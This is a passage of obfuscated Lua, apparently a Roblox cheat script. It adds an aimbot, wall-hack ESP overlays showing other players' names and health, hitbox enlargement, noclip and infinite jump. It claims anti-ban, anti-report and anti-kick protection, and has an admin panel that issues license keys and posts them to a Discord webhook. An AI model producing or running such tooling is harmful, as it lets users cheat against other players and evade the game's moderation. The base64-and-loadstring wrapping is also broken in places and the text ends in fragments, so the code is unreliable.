CreateToggle(EspPage, loadstring(base64decode("8J+Pt++4jyBFU1AgTmFtZSAvIEhlYWx0aCAvIERpc3Q="))(), loadstring(base64decode("4LiK4Li34LmI4LitIOC5gOC4peC4t+C4reC4lCDguKPguLDguKLguLDguKvguYjguLLguIc="))(), getgenv().UltimateStg.ESPNameInfo, function(state)
    getgenv().UltimateStg.ESPNameInfo = state
    ShowNotification(loadstring(base64decode("RVNQ"))(), loadstring(base64decode("RVNQIEluZm86IA=="))() .. tostring(state))
    if not state then
        for _, espData in pairs(ESPContainer) do
            if espData.NameTag then espData.NameTag.Visible = false end
        end
    end
end)
CreateSlider(EspPage, loadstring(base64decode("8J+OryBNYXggRVNQIERpc3RhbmNl"))(), loadstring(base64decode("4Lij4Liw4Lii4Liw4LiX4Liy4LiHIEVTUCDguKrguLnguIfguKrguLjguJQ="))(), 50, 500, getgenv().UltimateStg.ESPDistanceMax, function(Z1gjcVPr) getgenv().UltimateStg.ESPDistanceMax = Z1gjcVPr end)

-- 4. Aimbot
local AimbotPage = CreatePage(loadstring(base64decode("8J+OryBBaW1ib3Q="))(), 420)
AddTabButton(loadstring(base64decode("8J+OryBBaW1ib3Q="))(), loadstring(base64decode("4Lil4LmH4Lit4LiE4LmA4Lib4LmJ4Liy"))())
CreateToggle(AimbotPage, loadstring(base64decode("8J+RkSBBaW1ib3QgLSBIZWFkIExvY2s="))(), loadstring(base64decode("4Lil4LmH4Lit4LiE4Lir4Lix4Lin"))(), getgenv().UltimateStg.AimbotHead, function(state)
    getgenv().UltimateStg.AimbotHead = state
    if state then getgenv().UltimateStg.AimbotTorso = false end
    ShowNotification(loadstring(base64decode("QWltYm90"))(), loadstring(base64decode("SGVhZCBMb2NrOiA="))() .. tostring(state))
end)
CreateToggle(AimbotPage, loadstring(base64decode("8J+OryBBaW1ib3QgLSBUb3JzbyBMb2Nr"))(), loadstring(base64decode("4Lil4LmH4Lit4LiE4LiV4Lix4Lin"))(), getgenv().UltimateStg.AimbotTorso, function(state)
    getgenv().UltimateStg.AimbotTorso = state
    if state then getgenv().UltimateStg.AimbotHead = false end
    ShowNotification(loadstring(base64decode("QWltYm90"))(), loadstring(base64decode("VG9yc28gTG9jazog"))() .. tostring(state))
end)
CreateToggle(AimbotPage, loadstring(base64decode("8J+UriBTaG93IEZPVg=="))(), loadstring(base64decode("4LmB4Liq4LiU4LiH4Lin4LiHIEZPVg=="))(), getgenv().UltimateStg.ShowFOV, function(state)
    getgenv().UltimateStg.ShowFOV = state
    FOVCircle.Visible = state
    ShowNotification(loadstring(base64decode("QWltYm90"))(), loadstring(base64decode("U2hvdyBGT1Y6IA=="))() .. tostring(state))
end)
CreateSlider(AimbotPage, loadstring(base64decode("4pqZ77iPIEZPViBTaXpl"))(), loadstring(base64decode("4LiC4LiZ4Liy4LiUIEZPVg=="))(), 30, 500, getgenv().UltimateStg.FOVSize, function(Z1gjcVPr) getgenv().UltimateStg.FOVSize = Z1gjcVPr end)

local FOVColorBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), AimbotPage)
FOVColorBtn.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
FOVColorBtn.BorderColor3 = Color3.fromRGB(45, 60, 90)
FOVColorBtn.BorderSizePixel = 1
FOVColorBtn.Size = UDim2.new(1, -6, 0, 32)
FOVColorBtn.Font = Enum.Font.GothamSemibold
FOVColorBtn.Text = loadstring(base64decode("8J+OqCBGT1YgQ29sb3IgU3R5bGU6IA=="))() .. FOVColorNames[1]
FOVColorBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FOVColorBtn.TextSize = 8
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), FOVColorBtn).CornerRadius = UDim.new(0, 5)

FOVColorBtn.MouseButton1Click:Connect(function()
    getgenv().UltimateStg.FOVColorMode = getgenv().UltimateStg.FOVColorMode + 1
    if getgenv().UltimateStg.FOVColorMode > 5 then
        getgenv().UltimateStg.FOVColorMode = 1
    end
    local mode = getgenv().UltimateStg.FOVColorMode
    FOVColorBtn.Text = loadstring(base64decode("8J+OqCBGT1YgQ29sb3IgU3R5bGU6IA=="))() .. FOVColorNames[mode]
    if mode == 1 then
        FOVColorBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    else
        FOVColorBtn.TextColor3 = FOVColorList[mode - 1]
    end
end)

-- 5. Settings
local SettingsPage = CreatePage(loadstring(base64decode("4pqZ77iPIFNldHRpbmdz"))())
AddTabButton(loadstring(base64decode("4pqZ77iPIFNldHRpbmdz"))(), loadstring(base64decode("4LiV4Lix4LmJ4LiH4LiE4LmI4Liy"))())
CreateToggle(SettingsPage, loadstring(base64decode("8J+TiiBGbG9hdGluZyBGUFMvUGluZw=="))(), loadstring(base64decode("4Liq4LiW4Li04LiV4Li04Lil4Lit4Lii"))(), getgenv().UltimateStg.FloatingStats, function(state)
    getgenv().UltimateStg.FloatingStats = state
    FloatFrame.Visible = state
    ShowNotification(loadstring(base64decode("U2V0dGluZ3M="))(), loadstring(base64decode("RmxvYXRpbmcgU3RhdHM6IA=="))() .. tostring(state))
end)
CreateToggle(SettingsPage, loadstring(base64decode("4pqhIEZQUyAmIFBpbmcgQm9vc3Rlcg=="))(), loadstring(base64decode("4Lia4Li54Liq4LiE4Lin4Liy4Lih4Lil4Li34LmI4LiZ"))(), getgenv().UltimateStg.FPSBoost, function(state)
    getgenv().UltimateStg.FPSBoost = state
    if state then
        pcall(function()
            settings():GetService(loadstring(base64decode("TmV0d29ya1NldHRpbmdz"))()).IncomingReplicationLag = 0
            Lighting.GlobalShadows = false
        end)
        ShowNotification(loadstring(base64decode("U2V0dGluZ3M="))(), loadstring(base64decode("RlBTIEJvb3N0ZXI6IE9O"))())
    else
        pcall(function()
            settings():GetService(loadstring(base64decode("TmV0d29ya1NldHRpbmdz"))()).IncomingReplicationLag = 0.1
            Lighting.GlobalShadows = true
        end)
        ShowNotification(loadstring(base64decode("U2V0dGluZ3M="))(), loadstring(base64decode("RlBTIEJvb3N0ZXI6IE9GRg=="))())
    end
end)

-- 6. Security
local SecurityPage = CreatePage(loadstring(base64decode("8J+boe+4jyBTZWN1cml0eQ=="))())
AddTabButton(loadstring(base64decode("8J+boe+4jyBTZWN1cml0eQ=="))(), loadstring(base64decode("4LiE4Lin4Liy4Lih4Lib4Lil4Lit4LiU4Lig4Lix4Lii"))())
local SecInfoCard = Instance.new(loadstring(base64decode("RnJhbWU="))(), SecurityPage)
SecInfoCard.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
SecInfoCard.BorderColor3 = Color3.fromRGB(45, 60, 90)
SecInfoCard.BorderSizePixel = 1
SecInfoCard.Size = UDim2.new(1, -6, 0, 130)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), SecInfoCard).CornerRadius = UDim.new(0, 6)

local SI_Title = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), SecInfoCard)
SI_Title.BackgroundTransparency = 1
SI_Title.Position = UDim2.new(0, 10, 0, 8)
SI_Title.Size = UDim2.new(1, -20, 0, 16)
SI_Title.Font = Enum.Font.GothamBold
SI_Title.Text = loadstring(base64decode("8J+boe+4jyBTaGllbGQgUHJvdGVjdGlvbiBBY3RpdmU="))()
SI_Title.TextColor3 = Color3.fromRGB(0, 180, 255)
SI_Title.TextSize = 9
SI_Title.TextXAlignment = Enum.TextXAlignment.Left

local SI_Desc = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), SecInfoCard)
SI_Desc.BackgroundTransparency = 1
SI_Desc.Position = UDim2.new(0, 10, 0, 28)
SI_Desc.Size = UDim2.new(1, -20, 0, 95)
SI_Desc.Font = Enum.Font.Gotham
SI_Desc.Text = loadstring(base64decode("4oCiIEFudGktQmFuICYgVGVsZW1ldHJ5OiDguJvguYnguK3guIfguIHguLHguJnguYHguJrguJlcbuKAoiBBbnRpLVJlcG9ydDog4Lia4Lil4LmH4Lit4LiB4LiB4Liy4Lij4Lij4Li14Lie4Lit4Lij4LmM4LiVXG7igKIgQW50aS1LaWNrOiDguJvguYnguK3guIfguIHguLHguJnguYDguJXguLAv4LiU4Li24LiH4LiV4Lix4LinXG7igKIgQ2xlYW4gQ2FjaGU6IOC4peC5ieC4suC4h+C5geC4o+C4oeC4reC4seC4leC5guC4meC4oeC4seC4leC4tA=="))()
SI_Desc.TextColor3 = Color3.fromRGB(160, 180, 210)
SI_Desc.TextSize = 8
SI_Desc.TextXAlignment = Enum.TextXAlignment.Left

-- 7. DEV & ADMIN PANEL (แยกสิทธิ์ Owner และ Admin ชัดเจน)
if Owners[LocalPlayer.Name] or Admins[LocalPlayer.Name] then
    local DevPage = CreatePage(loadstring(base64decode("8J+boO+4jyBERVYgLyBBRE1JTg=="))(), 460)
    AddTabButton(loadstring(base64decode("8J+boO+4jyBERVY="))(), loadstring(base64decode("4Lij4Liw4Lia4Lia4LmB4Lit4LiU4Lih4Li04LiZ"))())
    
    local DevCard = Instance.new(loadstring(base64decode("RnJhbWU="))(), DevPage)
    DevCard.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
    DevCard.BorderColor3 = Color3.fromRGB(45, 60, 90)
    DevCard.BorderSizePixel = 1
    DevCard.Size = UDim2.new(1, -6, 0, 215)
    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), DevCard).CornerRadius = UDim.new(0, 6)
    
    local DC_Head = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), DevCard)
    DC_Head.BackgroundTransparency = 1
    DC_Head.Position = UDim2.new(0, 10, 0, 8)
    DC_Head.Size = UDim2.new(1, -20, 0, 16)
    DC_Head.Font = Enum.Font.GothamBold
    local roleText = Owners[LocalPlayer.Name] and loadstring(base64decode("4q2QIE9XTkVSIEtFWSBHRU5FUkFUT1IgUEFORUw="))() : loadstring(base64decode("8J+boe+4jyBBRE1JTiBLRVkgR0VORVJBVE9SIFBBTkVM"))()
    DC_Head.Text = roleText
    DC_Head.TextColor3 = Color3.fromRGB(255, 200, 0)
    DC_Head.TextSize = 9
    DC_Head.TextXAlignment = Enum.TextXAlignment.Left
    
    local KeyInput = Instance.new(loadstring(base64decode("VGV4dEJveA=="))(), DevCard)
    KeyInput.BackgroundColor3 = Color3.fromRGB(15, 17, 26)
    KeyInput.BorderColor3 = Color3.fromRGB(45, 60, 90)
    KeyInput.BorderSizePixel = 1
    KeyInput.Position = UDim2.new(0, 10, 0, 32)
    KeyInput.Size = UDim2.new(1, -20, 0, 30)
    KeyInput.Font = Enum.Font.Gotham
    KeyInput.PlaceholderText = loadstring(base64decode("4Lie4Li04Lih4Lie4LmM4LiK4Li34LmI4Lit4LiE4Li14Lii4LmM4LiX4Li14LmI4LiV4LmJ4Lit4LiH4LiB4Liy4Lij4Liq4Lij4LmJ4Liy4LiHICjguYDguIrguYjguJkgTUlOLVZJUC1YWVop"))()
    KeyInput.Text = loadstring(base64decode(""))()
    KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    KeyInput.PlaceholderColor3 = Color3.fromRGB(110, 130, 170)
    KeyInput.TextSize = 8
    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), KeyInput).CornerRadius = UDim.new(0, 4)
    
    local selectedDays = 1
    local DaysLabel = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), DevCard)
    DaysLabel.BackgroundTransparency = 1
    DaysLabel.Position = UDim2.new(0, 10, 0, 68)
    DaysLabel.Size = UDim2.new(1, -20, 0, 16)
    DaysLabel.Font = Enum.Font.GothamBold
    DaysLabel.Text = loadstring(base64decode("4o+x77iPIOC5gOC4peC4t+C4reC4geC4reC4suC4ouC4uOC4guC4reC4h+C4hOC4teC4ouC5jDogWyAxIOC4p+C4seC4mSBd"))()
    DaysLabel.TextColor3 = Color3.fromRGB(0, 180, 255)
    DaysLabel.TextSize = 8
    DaysLabel.TextXAlignment = Enum.TextXAlignment.Left
    
    local function CreateDayBtn(posX, text, daysVal)
        local btn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), DevCard)
        btn.BackgroundColor3 = Color3.fromRGB(30, 40, 65)
        btn.BorderSizePixel = 0
        btn.Position = UDim2.new(posX, 0, 0, 90)
        btn.Size = UDim2.new(0.15, -4, 0, 24)
        btn.Font = Enum.Font.GothamBold
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextSize = 8
        Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), btn).CornerRadius = UDim.new(0, 4)
        
        btn.MouseButton1Click:Connect(function()
            -- ถ้า Admin กดเลือก loadstring(base64decode("4LiW4Liy4Lin4Lij"))() (0 วัน) เด้ง Popup แจ้งเตือนทันที
            if daysVal == 0 and not Owners[LocalPlayer.Name] then
                AlertPopup.Visible = true
                return
            end
            selectedDays = daysVal
            DaysLabel.Text = loadstring(base64decode("4o+x77iPIOC5gOC4peC4t+C4reC4geC4reC4suC4ouC4uOC4guC4reC4h+C4hOC4teC4ouC5jDogWyA="))() .. text .. loadstring(base64decode("IF0="))()
        end)
    end
    
    CreateDayBtn(0.00, loadstring(base64decode("MSDguKfguLHguJk="))(), 1)
    CreateDayBtn(0.16, loadstring(base64decode("MyDguKfguLHguJk="))(), 3)
    CreateDayBtn(0.32, loadstring(base64decode("NyDguKfguLHguJk="))(), 7)
    CreateDayBtn(0.48, loadstring(base64decode("MTUg4Lin4Lix4LiZ"))(), 15)
    CreateDayBtn(0.64, loadstring(base64decode("MzAg4Lin4Lix4LiZ"))(), 30)
    CreateDayBtn(0.80, loadstring(base64decode("4LiW4Liy4Lin4Lij"))(), 0)
    
    local GenBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), DevCard)
    GenBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 100)
    GenBtn.BorderSizePixel = 0
    GenBtn.Position = UDim2.new(0, 10, 0, 124)
    GenBtn.Size = UDim2.new(1, -20, 0, 32)
    GenBtn.Font = Enum.Font.GothamBold
    GenBtn.Text = loadstring(base64decode("4p6VIOC4quC4o+C5ieC4suC4h+C4hOC4teC4ouC5jCAmIOC4hOC4seC4lOC4peC4reC4gSAoR2VuZXJhdGUgS2V5KQ=="))()
    GenBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    GenBtn.TextSize = 9
    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), GenBtn).CornerRadius = UDim.new(0, 4)
    
    GenBtn.MouseButton1Click:Connect(function()
        if selectedDays == 0 and not Owners[LocalPlayer.Name] then
            AlertPopup.Visible = true
            return
        end

        local newKey = KeyInput.Text
        if newKey == loadstring(base64decode(""))() then
            newKey = loadstring(base64decode("TUlOLQ=="))() .. math.random(100000, 999999)
        end
        
        local expiryTime = 0
        if selectedDays > 0 then
            expiryTime = os.time() + (selectedDays * 24 * 60 * 60)
        end
        
        KeyDatabase[newKey] = {Used = false, ExpiresAt = expiryTime}
        pcall(function() setclipboard(newKey) end)
        
        GenBtn.Text = loadstring(base64decode("4pyFIOC4quC4o+C5ieC4suC4h+C5geC4peC4sOC4hOC4seC4lOC4peC4reC4geC4hOC4teC4ouC5jOC4quC4s+C5gOC4o+C5h+C4iDog"))() .. newKey
        ShowNotification(loadstring(base64decode("8J+UkSBLRVkgQ1JFQVRFRA=="))(), loadstring(base64decode("4Liq4Lij4LmJ4Liy4LiH4LmB4Lil4Liw4LiE4Lix4LiU4Lil4Lit4LiB4LiE4Li14Lii4LmM4Liq4Liz4LmA4Lij4LmH4LiIIQ=="))())
        
        SendDiscordWebhook(loadstring(base64decode("8J+boO+4jyBOZXcgS2V5IEdlbmVyYXRlZA=="))(), loadstring(base64decode("Q3JlYXRvcjogKio="))() .. LocalPlayer.Name .. loadstring(base64decode("Kipcbk5ldyBLZXk6IGA="))() .. newKey .. loadstring(base64decode("YFxuRXhwaXJlczogYA=="))() .. selectedDays .. loadstring(base64decode("IERheXNg"))(), 16776960)

        task.wait(2)
        GenBtn.Text = loadstring(base64decode("4p6VIOC4quC4o+C5ieC4suC4h+C4hOC4teC4ouC5jCAmIOC4hOC4seC4lOC4peC4reC4gSAoR2VuZXJhdGUgS2V5KQ=="))()
    end)
end

RenderConnection = RunService.RenderStepped:Connect(function(dt)
    if not getgenv().HubLoaded then
        FOVCircle.Visible = false
        for _, espData in pairs(ESPContainer) do
            if espData.Box then espData.Box.Visible = false end
            if espData.Tracer then espData.Tracer.Visible = false end
            if espData.NameTag then espData.NameTag.Visible = false end
        end
        return 
    end

    local tickVal = tick() * 0.4
    local rgbColor = Color3.fromHSV(tickVal % 1, 1, 1)
    for _, stroke in pairs(MinimalRGBStrokes) do
        if stroke and stroke.Parent then
            stroke.Color = rgbColor
        end
    end

    local currentFPS = math.floor(1 / math.max(dt, 0.001))
    local pingVal = 0
    pcall(function() pingVal = math.floor(Stats.Network.ServerStatsItem[loadstring(base64decode("RGF0YSBQaW5n"))()]:GetValue()) end)
    if getgenv().UltimateStg.FloatingStats then
        FloatText.Text = loadstring(base64decode("8J+TiiBGUFM6IA=="))() .. currentFPS .. loadstring(base64decode("IHwgUGluZzog"))() .. pingVal .. loadstring(base64decode("bXM="))()
    end

    pcall(function()
        if getgenv().UltimateStg.NoclipEnabled and LocalPlayer.Character then
            for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                    part.CanCollide = false
                end
            end
        end
    end)

    pcall(function()
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
                local hrp = plr.Character.HumanoidRootPart
                if getgenv().UltimateStg.HitboxExpander then
                    hrp.Size = Vector3.new(getgenv().UltimateStg.HitboxSize, getgenv().UltimateStg.HitboxSize, getgenv().UltimateStg.HitboxSize)
                    hrp.Transparency = 0.7
                    hrp.CanCollide = false
                else
                    hrp.Size = Vector3.new(2, 2, 1)
                    hrp.Transparency = 1
                end
            end
        end
    end)

    pcall(function()
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                local char = plr.Character
                if getgenv().UltimateStg.ESPGlow and char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))()) and char.Humanoid.Health > 0 then
                    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    local targetRoot = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    local inDist = true
                    if myRoot and targetRoot then
                        local dist = (myRoot.Position - targetRoot.Position).Magnitude
                        if dist > getgenv().UltimateStg.ESPDistanceMax then inDist = false end
                    end

                    if inDist then
                        if not char:FindFirstChild(loadstring(base64decode("VWx0aW1hdGVHbG93"))()) then
                            local glow = Instance.new(loadstring(base64decode("SGlnaGxpZ2h0"))())
                            glow.Name = loadstring(base64decode("VWx0aW1hdGVHbG93"))()
                            glow.Adornee = char
                            glow.FillColor = Color3.fromRGB(0, 120, 255)
                            glow.OutlineColor = Color3.fromRGB(150, 100, 255)
                            glow.FillTransparency = 0.3
                            glow.Parent = char
                        end
                    else
                        if char:FindFirstChild(loadstring(base64decode("VWx0aW1hdGVHbG93"))()) then char.UltimateGlow:Destroy() end
                    end
                else
                    if char and char:FindFirstChild(loadstring(base64decode("VWx0aW1hdGVHbG93"))()) then char.UltimateGlow:Destroy() end
                end
            end
        end
    end)

    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            if getgenv().UltimateStg.ESPBox or getgenv().UltimateStg.ESPTracer or getgenv().UltimateStg.ESPNameInfo then
                if not ESPContainer[plr] then
                    local box = Drawing.new(loadstring(base64decode("U3F1YXJl"))())
                    box.Visible = false
                    box.Color = Color3.fromRGB(0, 162, 255)
                    box.Thickness = 1.5
                    box.Filled = false

                    local tracer = Drawing.new(loadstring(base64decode("TGluZQ=="))())
                    tracer.Visible = false
                    tracer.Color = Color3.fromRGB(150, 100, 255)
                    tracer.Thickness = 1
                    tracer.Transparency = 0.7

                    local nameTag = Drawing.new(loadstring(base64decode("VGV4dA=="))())
                    nameTag.Visible = false
                    nameTag.Center = true
                    nameTag.Outline = true
                    nameTag.Color = Color3.fromRGB(255, 255, 255)
                    nameTag.Size = 12
                    nameTag.Font = 2

                    ESPContainer[plr] = {Box = box, Tracer = tracer, NameTag = nameTag}
                end

                local char = plr.Character
                local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                if char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))()) and char.Humanoid.Health > 0 and myRoot then
                    local hrp = char.HumanoidRootPart
                    local head = char:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
                    local dist = (myRoot.Position - hrp.Position).Magnitude

                    if head and dist <= getgenv().UltimateStg.ESPDistanceMax then
                        local topPosition = head.Position + Vector3.new(0, 0.7, 0)
                        local bottomPosition = hrp.Position - Vector3.new(0, 2.8, 0)
                        local topPos, topOnScreen = Camera:WorldToViewportPoint(topPosition)
                        local bottomPos, bottomOnScreen = Camera:WorldToViewportPoint(bottomPosition)

                        if topOnScreen or bottomOnScreen then
                            local box = ESPContainer[plr].Box
                            local tracer = ESPContainer[plr].Tracer
                            local nameTag = ESPContainer[plr].NameTag
                            local height = math.abs(bottomPos.Y - topPos.Y)
                            local width = height / 2

                            if getgenv().UltimateStg.ESPBox then
                                box.Size = Vector2.new(width, height)
                                box.Position = Vector2.new(topPos.X - width / 2, topPos.Y)
                                box.Visible = true
                            else
                                box.Visible = false
                            end

                            if getgenv().UltimateStg.ESPTracer then
                                tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y - 20)
                                tracer.To = Vector2.new(bottomPos.X, bottomPos.Y)
                                tracer.Visible = true
                            else
                                tracer.Visible = false
                            end

                            if getgenv().UltimateStg.ESPNameInfo then
                                local health = math.floor(char.Humanoid.Health)
                                nameTag.Text = loadstring(base64decode("8J+RpCA="))() .. plr.Name .. loadstring(base64decode("IHwg8J+SliA="))() .. health .. loadstring(base64decode("IEhQIHwg8J+TjSA="))() .. math.floor(dist) .. loadstring(base64decode("bQ=="))()
                                nameTag.Position = Vector2.new(topPos.X, topPos.Y - 20)
                                nameTag.Visible = true
                            else
                                nameTag.Visible = false
                            end
                        else
                            ESPContainer[plr].Box.Visible = false
                            ESPContainer[plr].Tracer.Visible = false
                            ESPContainer[plr].NameTag.Visible = false
                        end
                    else
                        if ESPContainer[plr] then
                            ESPContainer[plr].Box.Visible = false
                            ESPContainer[plr].Tracer.Visible = false
                            ESPContainer[plr].NameTag.Visible = false
                        end
                    end
                else
                    if ESPContainer[plr] then
                        ESPContainer[plr].Box.Visible = false
                        ESPContainer[plr].Tracer.Visible = false
                        ESPContainer[plr].NameTag.Visible = false
                    end
                end
            else
                if ESPContainer[plr] then
                    if ESPContainer[plr].Box then ESPContainer[plr].Box.Visible = false end
                    if ESPContainer[plr].Tracer then ESPContainer[plr].Tracer.Visible = false end
                    if ESPContainer[plr].NameTag then ESPContainer[plr].NameTag.Visible = false end
                end
            end
        end
    end

    pcall(function()
        if getgenv().UltimateStg.ShowFOV then
            FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
            FOVCircle.Radius = getgenv().UltimateStg.FOVSize
            local mode = getgenv().UltimateStg.FOVColorMode
            if mode == 1 then
                local hue = tick() % 5 / 5
                FOVCircle.Color = Color3.fromHSV(hue, 1, 1)
            else
                FOVCircle.Color = FOVColorList[mode - 1]
            end
            FOVCircle.Visible = true
        else
            FOVCircle.Visible = false
        end
    end)

    pcall(function()
        if getgenv().UltimateStg.AimbotHead or getgenv().UltimateStg.AimbotTorso then
            local closestTarget = nil
            local shortestDist = getgenv().UltimateStg.FOVSize
            local origin = Camera.CFrame.Position

            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))()) and plr.Character.Humanoid.Health > 0 then
                    local targetPart = nil
                    if getgenv().UltimateStg.AimbotHead then
                        targetPart = plr.Character:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
                    elseif getgenv().UltimateStg.AimbotTorso then
                        targetPart = plr.Character:FindFirstChild(loadstring(base64decode("VXBwZXJUb3Jzbw=="))()) or plr.Character:FindFirstChild(loadstring(base64decode("VG9yc28="))())
                    end

                    if targetPart then
                        local screenPos, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
                        if onScreen then
                            local mouseDist = (Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2) - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
                            if mouseDist < shortestDist then
                                local direction = targetPart.Position - origin
                                local raycastParams = RaycastParams.new()
                                raycastParams.FilterType = Enum.RaycastFilterType.Exclude
                                raycastParams.FilterDescendantsInstances = {LocalPlayer.Character, plr.Character}
                                local raycastResult = Workspace:Raycast(origin, direction, raycastParams)

                                if not raycastResult then
                                    shortestDist = mouseDist
                                    closestTarget = targetPart
                                end
                            end
                        end
                    end
                end
            end

            if closestTarget then
                Camera.CFrame = CFrame.new(Camera.CFrame.Position, closestTarget.Position)
            end
        end
    end)
end)

Players.PlayerRemoving:Connect(function(plr)
    if ESPContainer[plr] then
        pcall(function()
            if ESPContainer[plr].Box then ESPContainer[plr].Box:Remove() end
            if ESPContainer[plr].Tracer then ESPContainer[plr].Tracer:Remove() end
            if ESPContainer[plr].NameTag then ESPContainer[plr].NameTag:Remove() end
        end)
        ESPContainer[plr] = nil
    end
end)

UserInputService.JumpRequest:Connect(function()
    if getgenv().HubLoaded and getgenv().UltimateStg.InfiniteJumpEnabled then
        pcall(function()
            local char = LocalPlayer.Character
            if char and char:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))()) then
                char:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))()):ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
    end
end)

task.spawn(function()
    while task.wait(60) do
        if getgenv().HubLoaded and getgenv().UltimateStg.AntiAFKEnabled then
            pcall(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end)
        end
    end
end)
end
21WEKkKQ(9Z75p)
end)(...)
